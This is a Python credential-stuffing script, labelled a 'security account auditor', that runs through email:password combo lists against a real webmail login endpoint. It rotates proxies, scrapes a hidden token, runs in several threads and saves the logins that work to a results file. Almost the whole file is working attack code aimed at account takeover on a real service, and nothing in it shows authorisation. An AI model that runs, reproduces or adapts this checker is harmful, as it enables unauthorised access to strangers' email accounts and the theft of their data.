import requests
from bs4 import BeautifulSoup
import random
import time
import sys
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init

# Inisialisasi warna terminal
init(autoreset=True)

class ValosintChecker:
    def __init__(self, target_url, combo_file, proxy_file, threads):
        self.target_url = target_url
        self.combo_file = combo_file
        self.proxy_file = proxy_file
        self.threads = threads
        
        self.session = requests.Session()
        self.proxies = self._load_list(self.proxy_file)
        self.valid_count = 0
        self.bad_count = 0
        
        # Logo Visual (Fixed Escape Sequence)
        self.logo = f"""
{Fore.CYAN}    ____   ____  _     _       ____   ____  _  _  _____ 
{Fore.CYAN}   |    \\ |    || |   | |     |    | |    || || ||_   _|
{Fore.CYAN}   |  |  ||  |  || |   | |     |  |  ||  |  || || |  | |  
{Fore.CYAN}   |  |  ||  |  || |___| |___  |  |  ||  |  || || |  | |  
{Fore.CYAN}   |____/ |____||_____|_____| |____/ |____||_||_|  |_|  
{Fore.YELLOW}   =====================================================
{Fore.WHITE}   [+] NAME    : VALOSINT CHECKER ID (LITE VERSION)
{Fore.WHITE}   [+] PURPOSE : SECURITY ACCOUNT AUDITOR
{Fore.WHITE}   [+] STATUS  : {Fore.GREEN}ACTIVE / SATELLITE CONNECTED
{Fore.YELLOW}   =====================================================
        """

    def _load_list(self, file_path):
        if os.path.exists(file_path):
            with open(file_path, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]
        return []

    def _get_time(self):
        return datetime.now().strftime("%H:%M:%S")

    def _rotate_proxy(self):
        if not self.proxies:
            return None
        p = random.choice(self.proxies)
        return {"http": f"http://{p}", "https": f"http://{p}"}

    def check_account(self, credential):
        if ":" not in credential:
            return
        
        email, password = credential.split(":")
        proxy = self._rotate_proxy()
        session = requests.Session()
        
        # Animasi Satelit Muter
        chars = ["|", "/", "-", "\\"]
        for char in chars:
            sys.stdout.write(f"\r{Fore.BLUE}[{char}] {Fore.WHITE}Satelit Scanning: {Fore.CYAN}{email[:20]}...")
            sys.stdout.flush()
            time.sleep(0.05)

        try:
            # 1. Ambil Halaman Login (untuk Cookies & CSRF)
            res_get = session.get(self.target_url, proxies=proxy, timeout=10)
            soup = BeautifulSoup(res_get.text, 'html.parser')
            
            # Mencoba mencari token secara otomatis dari input hidden
            token_input = soup.find('input', {'type': 'hidden'})
            token = token_input['value'] if token_input else "none"

            # 2. Kirim Data Login
            payload = {
                'email': email, 
                'password': password, 
                'token': token,
                'login': 'submit'
            }
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
                'Referer': self.target_url
            }
            
            response = session.post(self.target_url, data=payload, headers=headers, proxies=proxy, timeout=15, allow_redirects=True)
            
            timestamp = self._get_time()
            proxy_log = proxy['http'].split('@')[-1] if proxy else "Direct"

            # Logika Validasi Asli
            if response.status_code == 200 and ("dashboard" in response.url or "success" in response.text.lower()):
                print(f"\r{Fore.GREEN}[{timestamp}] [APPROVE] {email} | Proxy: {proxy_log}")
                self._save("results/valid.txt", f"{timestamp} | {credential}")
                self.valid_count += 1
            else:
                print(f"\r{Fore.RED}[{timestamp}] [GAGAL]   {email} | Proxy: {proxy_log}")
                self.bad_count += 1

        except Exception as e:
            # Tetap tampilkan baris error jika gagal koneksi
            print(f"\r{Fore.YELLOW}[{self._get_time()}] [ERROR]   {email[:20]}... | Timed Out / Proxy Dead")

    def _save(self, name, data):
        os.makedirs(os.path.dirname(name), exist_ok=True)
        with open(name, "a") as f:
            f.write(data + "\n")

    def start(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(self.logo)
        
        accounts = self._load_list(self.combo_file)
        
        if not accounts:
            print(f"{Fore.RED}Gagal: File '{self.combo_file}' kosong atau tidak ditemukan!")
            return

        print(f"{Fore.WHITE}Stats: {Fore.CYAN}{len(accounts)} Accounts {Fore.WHITE}| {Fore.CYAN}{len(self.proxies)} Proxies")
        print(f"{Fore.YELLOW}Memulai koneksi satelit...\n")
        time.sleep(1)
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(self.check_account, accounts)

        print(f"\n{Fore.CYAN}=====================================================")
        print(f"{Fore.GREEN}SELESAI! VALID: {self.valid_count} | GAGAL: {self.bad_count}")
        print(f"{Fore.CYAN}Hasil disimpan di folder 'results/'")

if __name__ == "__main__":
    # CONFIGURATION
    URL_TARGET = "https://webmail.spectrum.net/index.php/mail/auth"
    FILE_COMBO = "combo.txt"
    FILE_PROXY = "proxies.txt"
    JUMLAH_THREAD = 5 
    
    checker = ValosintChecker(URL_TARGET, FILE_COMBO, FILE_PROXY, JUMLAH_THREAD)
    checker.start()
